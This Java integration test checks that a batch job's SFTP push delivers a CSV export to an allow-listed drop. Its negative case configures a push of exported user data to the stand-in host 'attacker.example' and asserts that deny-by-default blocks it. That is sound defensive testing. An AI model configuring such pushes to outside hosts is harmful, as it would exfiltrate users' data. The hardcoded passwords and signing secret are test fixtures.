package io.tesseraql.runtime;

import static org.assertj.core.api.Assertions.assertThat;

import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.IOException;
import java.io.UncheckedIOException;
import java.net.ServerSocket;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.Comparator;
import java.util.List;
import java.util.Map;
import java.util.stream.Stream;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import org.apache.sshd.common.file.virtualfs.VirtualFileSystemFactory;
import org.apache.sshd.server.SshServer;
import org.apache.sshd.server.auth.password.PasswordAuthenticator;
import org.apache.sshd.server.keyprovider.SimpleGeneratorHostKeyProvider;
import org.apache.sshd.sftp.server.SftpSubsystemFactory;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;
import org.testcontainers.junit.jupiter.Container;
import org.testcontainers.junit.jupiter.Testcontainers;
import org.testcontainers.postgresql.PostgreSQLContainer;

/**
 * The push step end to end over SFTP (docs/analytics-experience.md): an export step writes the
 * day's CSV and a push step delivers it to a remote (allow-listed) SFTP drop — served here by
 * an in-process Apache MINA sshd server, no Docker — under the push policy block's credential.
 * The negative twin proves deny-by-default: a target host outside
 * {@code tesseraql.connectors.push.allowedHosts} fails the job, it does not connect.
 */
@Testcontainers
class PushSftpIntegrationTest {

    @Container
    static final PostgreSQLContainer POSTGRES = new PostgreSQLContainer("postgres:16-alpine");

    private static final ObjectMapper MAPPER = new ObjectMapper();

    static TesseraqlRuntime runtime;
    static Path appHome;
    static Path sftpRoot;
    static SshServer sshd;

    @BeforeAll
    static void start() throws Exception {
        sftpRoot = Files.createTempDirectory("tesseraql-push-root");
        Files.createDirectories(sftpRoot.resolve("incoming"));
        startSftpServer();
        appHome = prepareAppHome();
        runtime = TesseraqlRuntime.start(appHome, freePort());
    }

    @AfterAll
    static void stop() throws IOException {
        if (runtime != null) {
            runtime.close();
        }
        if (sshd != null) {
            sshd.stop(true);
        }
        if (appHome != null) {
            deleteRecursively(appHome);
        }
        if (sftpRoot != null) {
            deleteRecursively(sftpRoot);
        }
    }

    @Test
    void theProducedFileLandsOnTheRemoteDropWhole() throws Exception {
        HttpResponse<String> run = send("POST",
                "/_tesseraql/ops/batch/jobs/user.pushReport/run",
                "{\"businessDate\": \"2026-04-02\"}");
        assertThat(run.body()).contains("COMPLETED");

        Path delivered = sftpRoot.resolve("incoming/users-2026-04-02.csv");
        assertThat(delivered).exists();
        assertThat(Files.readString(delivered)).startsWith("name,status").contains("sato");
        // The producer staged under the dot-name and renamed on completion; the staging
        // name must be gone, so a partner poller can never read a partial file.
        try (Stream<Path> files = Files.list(sftpRoot.resolve("incoming"))) {
            assertThat(files.filter(f -> f.getFileName().toString().startsWith(".uploading-")))
                    .isEmpty();
        }
    }

    @Test
    void aHostOutsideTheAllowListFailsTheJobWithoutConnecting() throws Exception {
        HttpResponse<String> run = send("POST",
                "/_tesseraql/ops/batch/jobs/user.pushElsewhere/run", "{}");
        assertThat(run.body()).contains("FAILED");

        String executionId = MAPPER.readTree(run.body()).path("executionId").asText();
        HttpResponse<String> detail = send("GET",
                "/_tesseraql/ops/batch/executions/" + executionId, null);
        assertThat(detail.body()).contains("allowedHosts").contains("deny by default");
    }

    private static void startSftpServer() throws IOException {
        sshd = SshServer.setUpDefaultServer();
        sshd.setHost("localhost");
        sshd.setPort(0);
        sshd.setKeyPairProvider(new SimpleGeneratorHostKeyProvider());
        PasswordAuthenticator auth = (username, password, session) -> "svc".equals(username)
                && "s3cr3t".equals(password);
        sshd.setPasswordAuthenticator(auth);
        sshd.setSubsystemFactories(List.of(new SftpSubsystemFactory()));
        sshd.setFileSystemFactory(new VirtualFileSystemFactory(sftpRoot.toAbsolutePath()));
        sshd.start();
    }

    private static Path prepareAppHome() throws IOException {
        Path source = Paths.get("..", "examples", "user-admin-app").toAbsolutePath().normalize();
        Path target = Files.createTempDirectory("tesseraql-push-it");
        try (Stream<Path> files = Files.walk(source)) {
            files.forEach(path -> copy(source, target, path));
        }
        Files.writeString(target.resolve("config/application.yml"), """
                server:
                  port: 0

                db:
                  main:
                    url: %s
                    username: %s
                    password: %s

                tesseraql:
                  connectors:
                    push:
                      allowedHosts:
                        - localhost
                      credentials:
                        partner-sftp:
                          username: svc
                          password: s3cr3t
                """.formatted(POSTGRES.getJdbcUrl(), POSTGRES.getUsername(),
                POSTGRES.getPassword()));

        Path jobDir = target.resolve("batch/partner");
        Files.createDirectories(jobDir);
        Files.writeString(jobDir.resolve("push-report.yml"), """
                version: tesseraql/v1
                id: user.pushReport
                kind: job
                recipe: batch-pipeline
                pipeline:
                  - id: extract
                    export:
                      format: csv
                    sql:
                      file: report.sql
                      mode: query
                  - id: deliver
                    push:
                      transport: sftp
                      host: localhost
                      port: %d
                      path: /incoming
                      credential: partner-sftp
                      file: steps.extract.transferId
                      as: users-{batch.businessDate}.csv
                """.formatted(sshd.getPort()));
        Files.writeString(jobDir.resolve("push-elsewhere.yml"), """
                version: tesseraql/v1
                id: user.pushElsewhere
                kind: job
                recipe: batch-pipeline
                pipeline:
                  - id: extract
                    export:
                      format: csv
                    sql:
                      file: report.sql
                      mode: query
                  - id: deliver
                    push:
                      transport: sftp
                      host: attacker.example
                      path: /incoming
                      credential: partner-sftp
                      file: steps.extract.transferId
                """);
        Files.writeString(jobDir.resolve("report.sql"),
                "select name, status from users order by name\n");
        return target;
    }

    private static HttpResponse<String> send(String method, String path, String body)
            throws Exception {
        HttpRequest.Builder request = HttpRequest.newBuilder(
                URI.create("http://localhost:" + runtime.port() + path))
                .header("Authorization", "Bearer " + token());
        if ("POST".equals(method)) {
            request.header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(body == null ? "{}" : body));
        } else {
            request.GET();
        }
        return HttpClient.newHttpClient().send(request.build(),
                HttpResponse.BodyHandlers.ofString());
    }

    private static String token() throws Exception {
        Base64.Encoder enc = Base64.getUrlEncoder().withoutPadding();
        String header = enc.encodeToString("{\"alg\":\"HS256\"}".getBytes(StandardCharsets.UTF_8));
        String payload = enc.encodeToString(MAPPER.writeValueAsBytes(TestClaims.addressed(
                Map.of("sub", "ops", "roles", List.of("BATCH_OPERATOR"),
                        "permissions", List.of("ops.app.*")))));
        Mac mac = Mac.getInstance("HmacSHA256");
        mac.init(new SecretKeySpec(
                "dev-only-secret-change-me-in-production".getBytes(StandardCharsets.UTF_8),
                "HmacSHA256"));
        String signature = enc.encodeToString(
                mac.doFinal((header + "." + payload).getBytes(StandardCharsets.US_ASCII)));
        return header + "." + payload + "." + signature;
    }

    private static int freePort() throws IOException {
        try (ServerSocket socket = new ServerSocket(0)) {
            return socket.getLocalPort();
        }
    }

    private static void copy(Path source, Path target, Path path) {
        try {
            Path destination = target.resolve(source.relativize(path).toString());
            if (Files.isDirectory(path)) {
                Files.createDirectories(destination);
            } else {
                Files.createDirectories(destination.getParent());
                Files.copy(path, destination);
            }
        } catch (IOException ex) {
            throw new UncheckedIOException(ex);
        }
    }

    private static void deleteRecursively(Path root) throws IOException {
        if (!Files.exists(root)) {
            return;
        }
        try (Stream<Path> tree = Files.walk(root)) {
            tree.sorted(Comparator.reverseOrder()).forEach(path -> {
                try {
                    Files.delete(path);
                } catch (IOException ignored) {
                    // best-effort cleanup
                }
            });
        }
    }
}
